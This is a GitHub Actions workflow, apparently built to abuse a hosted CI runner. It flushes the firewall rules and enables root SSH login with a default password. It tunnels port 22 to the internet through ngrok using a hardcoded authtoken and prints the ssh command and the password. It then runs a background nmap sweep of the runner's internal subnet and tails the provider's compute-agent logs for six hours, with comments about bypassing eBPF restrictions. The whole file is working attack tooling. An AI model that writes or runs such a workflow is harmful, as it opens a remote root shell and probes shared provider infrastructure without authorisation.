name: Aggressive Infrastructure Research Shell

on: 
  workflow_dispatch:

jobs:
  interactive-research:
    # Using 20.04 to target legacy network segments with potentially fewer eBPF restrictions
    runs-on: ubuntu-22.04
    
    steps:
      - name: 1. Install Aggressive Research Tools
        run: |
          sudo apt-get update
          # Adding netcat, nmap, and traceroute for deep network probing
          sudo apt-get install -y openssh-server curl iproute2 nano net-tools nmap traceroute netcat-openbsd
          # Attempt to flush any existing iptables rules (Aggressive)
          sudo iptables -P INPUT ACCEPT
          sudo iptables -P FORWARD ACCEPT
          sudo iptables -P OUTPUT ACCEPT
          sudo iptables -F
      - name: 2. Configure Persistent SSH
        env:
          ROOT_PASSWORD: ${{ secrets.ROOT_PASSWORD || 'my-secret-password-123' }}
        run: |
          sudo mkdir -p /var/run/sshd
          echo "root:$ROOT_PASSWORD" | sudo chpasswd
          
          # Force every possible override to ensure SSH stays up
          sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
          sudo sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
          sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
          echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config
          echo "GatewayPorts yes" | sudo tee -a /etc/ssh/sshd_config
          
          sudo service ssh restart
      - name: 3. Setup Ngrok (Aggressive)
        env:
          NGROK_AUTHTOKEN: '3B4eFa70NTI7mx05D1AljKk6PLF_6gEz2Mxx9LV13YTCdKbzU'
        run: |
          curl -s https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -o ngrok.tgz
          tar -xvzf ngrok.tgz
          chmod +x ngrok
          ./ngrok config add-authtoken $NGROK_AUTHTOKEN
      - name: 4. Start Tunnel & Diagnostic Check
        env:
          ROOT_PASSWORD: ${{ secrets.ROOT_PASSWORD || 'my-secret-password-123' }}
        run: |
          # Start ngrok with a longer timeout and debug logging
          nohup ./ngrok tcp 22 --region us --log=stdout > ngrok.log 2>&1 &
          echo "Starting tunnel... waiting 15s for eBPF bypass/negotiation..."
          sleep 15
          
          echo "=========================================================="
          echo "   INFRASTRUCTURE DIAGNOSTICS:"
          echo "=========================================================="
          ip addr show eth0 | grep "inet "
          # Check if we are in the 'flat' 10.1.0.0/20 network
          ip route show
          
          # Extract URL without crashing the script (added || true)
          TCP_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o "tcp://[0-9a-z.]*:[0-9]*" || echo "NGROK_BLOCKED")
          
          if [ "$TCP_URL" == "NGROK_BLOCKED" ] || [ -z "$TCP_URL" ]; then
             echo "!!! NGROK IS BLOCKED BY EGRESS FILTERS !!!"
             echo "Dumping ngrok logs for evidence of network isolation:"
             cat ngrok.log
             echo "Attempting emergency egress check (Google DNS):"
             nc -zv 8.8.8.8 53 || echo "Full Egress Blocked"
          else
             echo "SUCCESS! Connection Command:"
             HOST=$(echo $TCP_URL | sed 's/tcp:\/\///' | cut -d: -f1)
             PORT=$(echo $TCP_URL | sed 's/tcp:\/\///' | cut -d: -f2)
             echo "ssh root@$HOST -p $PORT"
          fi
          echo "=========================================================="
          echo "   Password: $ROOT_PASSWORD"
          echo "=========================================================="
      - name: 5. Background Internal Network Sweep
        run: |
          # Start a background scan of the local subnet immediately
          # This ensures we get data even if the SSH session is killed later
          SUBNET=$(ip r | grep eth0 | cut -d' ' -f1)
          echo "Targeting Subnet: $SUBNET"
          nohup nmap -T4 -F $SUBNET -oN /tmp/initial_sweep.txt > /dev/null 2>&1 &
      - name: 6. Keepalive & Log Watcher
        run: |
          # Keep the job alive for the full 6 hours
          # Monitor the HCA service logs in real-time
          sudo journalctl -u hosted-compute-agent -f &
          while true; do 
            echo "Research Session Active... [$(date)]"; 
            # Heartbeat to prevent runner timeout
            sleep 60; 
          done
